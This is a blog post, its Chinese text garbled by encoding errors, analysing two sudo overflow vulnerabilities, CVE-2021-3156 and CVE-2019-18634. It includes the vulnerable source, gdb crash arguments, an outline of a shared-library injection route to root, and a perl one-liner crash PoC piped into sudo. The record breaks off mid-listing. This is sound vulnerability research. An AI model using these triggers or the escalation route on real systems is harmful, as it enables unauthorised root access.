<!DOCTYPE html>
<html lang="en-us">
    
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="theme-color" content="dark">
    <title> ä»¥ä¸¤ä¸ªSudoæŒ‡ä»¤ç¼“å†²åŒºæº¢å‡ºCVEè¿›è¡Œåˆ†æ | FMYY&#39;S Note</title>
    
    
    
    <link rel="stylesheet" href="/sass/main.min.96090b4177a3194fa2de0860f2c55524d6582b68a41222fe4030905ef033075a.css">
</head>

    <body class="dark">
        <nav class="navbar">
    <div class="container">
        <div class="flex">
            <div>
                <a class="brand" href="/">
                    
                    <span class="emoji">
                        ğŸ˜
                    </span>
                    
                    FMYY&#39;S Note
                    </a>
            </div>
            <div class="flex">
                
                <a href="/articles/">Articles</a>
                
                <button id="dark-mode-button"></button>
            </div>
            </div>
    </div>
</nav>
        <main>
            

<div class="container">
    <article>
        <header class="article-header">
            <div class="thumb">
                <div>
                    <h1>ä»¥ä¸¤ä¸ªSudoæŒ‡ä»¤ç¼“å†²åŒºæº¢å‡ºCVEè¿›è¡Œåˆ†æ</h1>
                    <div class="post-meta">
                        <div>
                            By  on <time>February 02, 2021</time>
                        </div>
                        <div class="tags">
                            
                            <a href="/tags/sudo/">Sudo</a>
                            
                            <a href="/tags/overflow/">Overflow</a>
                            
                            <a href="/tags/cve/">CVE</a>
                            
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </article>

    <div class="article-post">
    <p>sudoæ˜¯ä¸€ä¸ªå¤§å¤šæ•°Linuxæˆ–è€…Unixæ“ä½œç³»ç»Ÿä¸­éƒ½å­˜åœ¨çš„ç³»ç»Ÿç®¡ç†æŒ‡ä»¤,æ˜¯ä¸€ä¸ªå…è®¸ç³»ç»Ÿç®¡ç†å‘˜è®©æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›æˆ–è€…å…¨éƒ¨çš„rootå‘½ä»¤çš„å·¥å…·.</p>
<p>æ­¤æ¬¡ä»¥CVE-2021-3156å’ŒCVE-2019-18634ä¸¤ä¸ªSudoæŒ‡ä»¤çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´è¿›è¡Œåˆ†æ</p>
<h3 id="cve-2021-3156">CVE-2021-3156</h3>
<h4 id="å½±å“èŒƒå›´">å½±å“èŒƒå›´</h4>
<pre><code>Sudo 1.8.2 - 1.8.31p2
Sudo 1.9.0 - 1.9.5p1
</code></pre>
<h4 id="å¦‚ä½•æ£€æµ‹è‡ªå·±ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ­¤æ¼æ´">å¦‚ä½•æ£€æµ‹è‡ªå·±ç³»ç»Ÿæ˜¯å¦å­˜åœ¨æ­¤æ¼æ´ï¼Ÿ</h4>
<p>ç»ˆç«¯è¾“å…¥ å‘½ä»¤ <code>&quot;sudoedit -s /&quot;</code>åæ‰§è¡Œ
ä¼šå‡ºç°ä»¥ä¸‹ä¸¤ç§æƒ…å†µ</p>
<ol>
<li>è‹¥å‡ºç°&quot;sudoeditï¼š&ldquo;å¼€å¤´çš„é”™è¯¯å“åº”,åˆ™ç³»ç»Ÿå—åˆ°æ­¤æ¼æ´å½±å“.</li>
<li>è‹¥å‡ºç°&quot;usageï¼š&ldquo;å¼€å¤´çš„é”™è¯¯å“åº”,åˆ™è¡¨ç¤ºè¯¥æ¼æ´å·²è¢«è¡¥ä¸ä¿®å¤.</li>
</ol>
<h4 id="è°ƒè¯•">è°ƒè¯•</h4>
<p>æ­¤å¤„é€‰æ‹©äº†Sudo-1.8.31ç‰ˆæœ¬çš„Sudoç¨‹åºæ¥è¿›è¡Œå¤ç°,æœ€å¼€å§‹æˆ‘æ˜¯ç¼–è¯‘äº†ä¸€ésudoæºç æ¥è¿›è¡Œè°ƒè¯•,ç»“æœç¼–è¯‘å‡ºæ¥çš„sudoç¨‹åºå’Œubuntuç³»ç»Ÿè‡ªå¸¦çš„sudoæœ‰ç‚¹ä¸ä¸€æ ·,æ‰€ä»¥æœ€åæˆ‘è¿˜æ˜¯ç›´æ¥è°ƒè¯•çš„ubuntuç³»ç»Ÿè‡ªå¸¦çš„sudo,åªæ˜¯æ²¡æœ‰æºç æ–­ç‚¹ä¸å¤ªæ–¹ä¾¿</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">gdb ./sudoedit
......
pwndbg&gt; <span class="nb">set</span> args -s <span class="s1">&#39;\&#39;</span> <span class="m">112233445566</span> // è®¾ç½®å‚æ•°
pwndbg&gt; run
...
pwndbg&gt; b ./sudoers.c:847
pwndbg&gt; run
</code></pre></td></tr></table>
</div>
</div><p>æ¼æ´ä½ç½®ä½äº<code>plugins/sudoers/sudoers.c</code>ä»£ç æ–‡ä»¶<code>set_cmnd</code>å‡½æ•°ä¸­</p>
<p>å› ä¸ºå¯èƒ½æ–‡ä»¶ä»£ç æ˜¯åŠ¨æ€åŠ è½½çš„,æ‰€ä»¥å½“ç¨‹åºcrashçš„æ—¶å€™,æ‰å¯ä»¥ä¸‹æ–­ç‚¹,ç„¶åé‡æ–°è¿è¡Œ,æœ€åä¼šæ–­åœ¨æ–­ç‚¹ä½ç½®</p>
<h4 id="æ¼æ´ä»£ç ">æ¼æ´ä»£ç </h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="p">......</span>
	<span class="cm">/* set user_args */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">NewArgc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	    <span class="kt">char</span> <span class="o">*</span><span class="n">to</span><span class="p">,</span> <span class="o">*</span><span class="n">from</span><span class="p">,</span> <span class="o">**</span><span class="n">av</span><span class="p">;</span>
	    <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>

	    <span class="cm">/* Alloc and build up user_args. */</span>
	    <span class="k">for</span> <span class="p">(</span><span class="n">size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="o">*</span><span class="n">av</span><span class="p">;</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span>
		<span class="n">size</span> <span class="o">+=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="n">av</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	    <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">user_args</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;%s: %s&#34;</span><span class="p">),</span> <span class="n">__func__</span><span class="p">,</span> <span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to allocate memory&#34;</span><span class="p">));</span>
		<span class="n">debug_return_int</span><span class="p">(</span><span class="n">NOT_FOUND_ERROR</span><span class="p">);</span>
	    <span class="p">}</span>
	    <span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">sudo_mode</span><span class="p">,</span> <span class="n">MODE_SHELL</span><span class="o">|</span><span class="n">MODE_LOGIN_SHELL</span><span class="p">))</span> <span class="p">{</span>
		<span class="cm">/*
</span><span class="cm">		 * When running a command via a shell, the sudo front-end
</span><span class="cm">		 * escapes potential meta chars.  We unescape non-spaces
</span><span class="cm">		 * for sudoers matching and logging purposes.
</span><span class="cm">		 */</span>
		<span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="n">from</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">);</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">from</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">from</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isspace</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">from</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>	
			    <span class="n">from</span><span class="o">++</span><span class="p">;</span>
			<span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
		    <span class="p">}</span>
		    <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="o">*--</span><span class="n">to</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
	    <span class="p">}</span>
<span class="p">......</span>
</code></pre></td></tr></table>
</div>
</div><p>è‹¥æ‰§è¡Œ<code>sudoedit</code>çš„æ—¶å€™æœ‰ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°,<code>NewArgc &gt; 1</code>,å¹¶è¿›å…¥ä¸Šè¿°è¿™ä¸ªåˆ†æ”¯</p>
<p>é¦–å…ˆä¼šéå†å¹¶è®¡ç®—å‡ºæ‰€æœ‰å‚æ•°çš„æ€»å¤§å°,åˆ©ç”¨mallocç”³è¯·ä¸€æ®µç©ºé—´,ä¹‹ååˆ™æ˜¯å°†å‚æ•°æ‹·è´åˆ°åˆšæ‰ç”³è¯·çš„ç©ºé—´ä¸­</p>
<h4 id="æ¼æ´ç‚¹">æ¼æ´ç‚¹</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C">		<span class="k">for</span> <span class="p">(</span><span class="n">to</span> <span class="o">=</span> <span class="n">user_args</span><span class="p">,</span> <span class="n">av</span> <span class="o">=</span> <span class="n">NewArgv</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">(</span><span class="n">from</span> <span class="o">=</span> <span class="o">*</span><span class="n">av</span><span class="p">);</span> <span class="n">av</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">from</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">from</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\\&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isspace</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">from</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
			    <span class="n">from</span><span class="o">++</span><span class="p">;</span>
			<span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="o">*</span><span class="n">from</span><span class="o">++</span><span class="p">;</span>
		    <span class="p">}</span>
		    <span class="o">*</span><span class="n">to</span><span class="o">++</span> <span class="o">=</span> <span class="sc">&#39; &#39;</span><span class="p">;</span>
		<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºç¨‹åºé”™è¯¯çš„è½¬ä¹‰,å°†ä¼ å…¥çš„''å­—ç¬¦åæ–¹çš„<code>\x00</code>çœ‹ä½œè½¬ä¹‰å­—ç¬¦,è€Œ<code>\x00</code>ä¹Ÿä¸æ˜¯ç©ºç™½å­—ç¬¦,æ‰€ä»¥ç»•è¿‡äº†<code>isspace</code>ç©ºç™½å­—ç¬¦çš„æ£€æµ‹<br>
è‡³æ­¤,ç¬¬ä¸€ä¸ªå‚æ•°æ‹·è´çš„æ—¶å€™ä¼šä»¥<code>'\' 112233445566</code>ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°è¿›è¡Œæ‹·è´,ç„¶åå†æ‹·è´ç¬¬äºŒä¸ªå‚æ•°,å³<code>112233445566</code>,æœ€åæ‹·è´çš„å­—ç¬¦è¶…è¿‡äº†ç”³è¯·çš„ç©ºé—´çš„å¤§å°,å½¢æˆäº†ç¼“å†²åŒºæº¢å‡ºæ¼æ´</p>
<h4 id="åˆ©ç”¨">åˆ©ç”¨</h4>
<p>Qualyså›¢é˜Ÿåœ¨åšå®¢ä¸­,ç»™å‡ºäº†ä¸‰ä¸ªåˆ©ç”¨æ€è·¯,è¿™é‡Œæˆ‘é€‰æ‹©äº†ç¬¬äºŒç§æ€è·¯æ¥å¤ç°,å› ä¸ºç¬¬äºŒç§æ–¹æ³•å·²ç»åœ¨ä¸‰ä¸ªç‰ˆæœ¬çš„Linuxç³»ç»Ÿä¸ŠæˆåŠŸå®ç°äº†åˆ©ç”¨ä¸”githubæ˜Ÿæ˜Ÿç¬¬ä¸€åˆ™æ˜¯æ­¤æ–¹æ³•çš„åˆ©ç”¨è„šæœ¬å‘¢,æ­¤æ–¹æ³•ä¸»è¦è¿ç”¨äº†å †æº¢å‡ºè¦†ç›–å­—ç¬¦ä¸²æŒ‡é’ˆä¸ºå¯æ§å­—ç¬¦ä¸²æŒ‡é’ˆ,ä»è€Œåœ¨è°ƒç”¨<code>nss_load_libinary</code>çš„æ—¶å€™è¿›è¡Œçš„soæ³¨å…¥,æ­¤æ—¶æ³¨å…¥çš„soæ–‡ä»¶æ˜¯å¯æ§çš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">static</span> <span class="kt">int</span> <span class="nf">nss_load_library</span> <span class="p">(</span><span class="n">service_user</span> <span class="o">*</span><span class="n">ni</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">static</span> <span class="n">name_database</span> <span class="n">default_table</span><span class="p">;</span>
		<span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">=</span> <span class="n">nss_new_service</span> <span class="p">(</span><span class="n">service_table</span> <span class="o">?:</span> <span class="o">&amp;</span><span class="n">default_table</span><span class="p">,</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="cm">/* Load the shared library.  */</span>
		<span class="n">size_t</span> <span class="n">shlen</span> <span class="o">=</span> <span class="p">(</span><span class="mi">7</span> <span class="o">+</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">strlen</span> <span class="p">(</span><span class="n">__nss_shlib_revision</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
		<span class="kt">int</span> <span class="n">saved_errno</span> <span class="o">=</span> <span class="n">errno</span><span class="p">;</span>
		<span class="kt">char</span> <span class="n">shlib_name</span><span class="p">[</span><span class="n">shlen</span><span class="p">];</span>

		<span class="cm">/* Construct shared object name.  */</span>
		<span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">__stpcpy</span> <span class="p">(</span><span class="n">shlib_name</span><span class="p">,</span>
					      <span class="s">&#34;libnss_&#34;</span><span class="p">),</span>
				    <span class="n">ni</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">),</span>
			  <span class="s">&#34;.so&#34;</span><span class="p">),</span>
		<span class="n">__nss_shlib_revision</span><span class="p">);</span>

      <span class="n">ni</span><span class="o">-&gt;</span><span class="n">library</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">=</span> <span class="n">__libc_dlopen</span> <span class="p">(</span><span class="n">shlib_name</span><span class="p">);</span>
      <span class="p">......</span>
</code></pre></td></tr></table>
</div>
</div><p>æ­¤å¤„ä¼ å…¥äº†å‚æ•°ä¸ºä¸€ä¸ªç»“æ„ä½“æŒ‡é’ˆ,ç»“æ„ä½“ä¸º</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">service_user</span>
<span class="p">{</span>
	<span class="cm">/* And the link to the next entry.  */</span>
	<span class="k">struct</span> <span class="n">service_user</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
	<span class="cm">/* Action according to result.  */</span>
	<span class="n">lookup_actions</span> <span class="n">actions</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
	<span class="cm">/* Link to the underlying library object.  */</span>
	<span class="n">service_library</span> <span class="o">*</span><span class="n">library</span><span class="p">;</span>		
	<span class="cm">/* Collection of known functions.  */</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">known</span><span class="p">;</span>
	<span class="cm">/* Name of the service (`files&#39;, `dns&#39;, `nis&#39;, ...).  */</span>
	<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span> <span class="n">service_user</span><span class="p">;</span>
</code></pre></td></tr></table>
</div>
</div><p>åˆ©ç”¨è¿‡ç¨‹ä¸ºä¿®æ”¹<code>ni-&gt;library</code>ä¸ºç©ºæŒ‡é’ˆ,ä¹‹ååˆ™ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªåˆ†æ”¯ï¼Œè°ƒç”¨<code>nss_new_service</code>å‡½æ•°<br>
ä¸‹é¢æˆ‘ä»¬æ¥çœ‹çœ‹<code>nss_new_service</code>å‡½æ•°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">static</span> <span class="n">service_library</span> <span class="o">*</span> <span class="nf">nss_new_service</span> <span class="p">(</span><span class="n">name_database</span> <span class="o">*</span><span class="n">database</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">service_library</span> <span class="o">**</span><span class="n">currentp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">database</span><span class="o">-&gt;</span><span class="n">library</span><span class="p">;</span>

	<span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">currentp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span> <span class="p">((</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
			<span class="k">return</span> <span class="o">*</span><span class="n">currentp</span><span class="p">;</span>
		<span class="n">currentp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
	<span class="p">}</span>

  <span class="cm">/* We have to add the new service.  */</span>
	<span class="o">*</span><span class="n">currentp</span> <span class="o">=</span> <span class="p">(</span><span class="n">service_library</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">service_library</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">currentp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
	<span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">lib_handle</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">(</span><span class="o">*</span><span class="n">currentp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="k">return</span> <span class="o">*</span><span class="n">currentp</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">#endif
</span></code></pre></td></tr></table>
</div>
</div><p>éå†<code>database</code>é“¾è¡¨å¯»æ‰¾<code>ni-&gt;name</code>å¯¹åº”çš„<code>library</code>æŒ‡é’ˆ,è‹¥æ²¡æœ‰å‘ç°å¯¹åº”çš„ç»“æ„ä½“,åˆ™æ˜¯ç»§ç»­å¾€ä¸‹ä¸ºå½“å‰<code>name</code>åç§°åˆ›å»ºä¸€ä¸ªç»“æ„ä½“,ä¸”<code>lib_handle</code>æŒ‡é’ˆå†™0,å› æ­¤è¿”å›ä¹‹åå³å¯é€šè¿‡<code>if (ni-&gt;library-&gt;lib_handle == NULL)</code>æ­¤åˆ¤æ–­,è¿›å…¥å…¶åˆ†æ”¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="c1">//1.8.31/src/sudo.c:154
</span><span class="c1"></span><span class="n">setlocale</span><span class="p">(</span><span class="n">LC_ALL</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
<span class="n">bindtextdomain</span><span class="p">(</span><span class="n">PACKAGE_NAME</span><span class="p">,</span> <span class="n">LOCALEDIR</span><span class="p">);</span>
<span class="n">textdomain</span><span class="p">(</span><span class="n">PACKAGE_NAME</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>åœ¨<code>setlocale()</code>å‡½æ•°ä¸­å¯ä»¥è°ƒç”¨<code>malloc()</code>ä»¥åŠ<code>free()</code>å‡½æ•°,è¿›è¡Œå †å—çš„å¸ƒå±€,é€šè¿‡æ§åˆ¶<code>&quot;LC_ALL</code>,ä»è€Œè®©<code>nss_load_library</code>ä¼ å…¥çš„ç»“æ„ä½“ä½äºæ¼æ´ç‚¹æº¢å‡ºçš„å †å—çš„ä¸‹æ–¹ä¸è¿œå¤„</p>
<h5 id="æ€è·¯æ€»ç»“">æ€è·¯æ€»ç»“</h5>
<ol>
<li>å°†<code>ni-&gt;library</code>æŒ‡é’ˆå†™0,è¿›å…¥ç¬¬ä¸€ä¸ªåˆ†æ”¯</li>
<li>æ§åˆ¶ä½<code>ni-&gt;name</code>å­—ç¬¦ä¸²,ä¹‹åé€šè¿‡æ‹¼æ¥å‡ºçš„æœ€ç»ˆå­—ç¬¦ä¸²ä½œä¸ºsoæ–‡ä»¶çš„è·¯å¾„,åˆ™å¯ä»¥è°ƒç”¨<code>__libc_dlopen</code>åˆå§‹åŒ–è¿è¡Œè¯¥soæ–‡ä»¶</li>
<li>å¦‚æœ<code>nss_load_library</code>ä¼ å…¥çš„<code>service_user *ni</code>æŒ‡é’ˆå¯¹åº”çš„ç»“æ„ä½“ä½äºæ¼æ´ç‚¹å¤„ç”³è¯·çš„ç©ºé—´ä¸‹æ–¹ä¸è¿œå¤„,åˆ™å¯é€šè¿‡é”™è¯¯è½¬ä¹‰å¼•èµ·çš„å †æº¢å‡ºæ»¡è¶³ä¸Šè¿°ä¸¤ä¸ªæ¡ä»¶</li>
</ol>
<h3 id="cve-2019-18634">CVE-2019-18634</h3>
<p>CVE-2019-18634ç›¸å¯¹äºCVE-2021-3156æ¥è¯´,é™åˆ¶æ›´å¤§ä¸€äº›,å› ä¸ºéœ€è¦å­˜åœ¨<code>pwfeedback</code>é€‰é¡¹</p>
<h4 id="heading"></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">wget https://www.sudo.ws/dist/sudo-1.8.25.tar.gz
tar -zxvf ./sudo-1.8.25.tar.gz
<span class="nb">cd</span> ./sudo-1.8.25
./configure --prefix<span class="o">=</span>/tmp/build
make -j4
make install
</code></pre></td></tr></table>
</div>
</div><h4 id="å¼€å¯-pwfeedback-é€‰é¡¹">å¼€å¯ pwfeedback é€‰é¡¹</h4>
<p>åœ¨<code>/etc/sudoers</code>è§„åˆ™ä¸­æ·»åŠ <code>Defaults pwfeedback</code><br>
å¼€å¯å,åœ¨ç”¨æˆ·åˆ‡æ¢çš„è¾“å…¥å¯†ç æ—¶,ä¼šæœ‰è§†è§‰åé¦ˆ,å‡ºç°&rdquo;*&ldquo;ç¬¦å·</p>
<h4 id="poc">POC</h4>
<p>POC1[&lt;=1.8.25]</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">perl -e <span class="s1">&#39;print((&#34;A&#34; x 100 . &#34;\x{00}&#34;) x 50)&#39;</span> <span class="p">|</span> sudo -S id
</code></pre></td></tr></table>
</div>
</div><p>POC2[1.8.26,1.8.30]</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
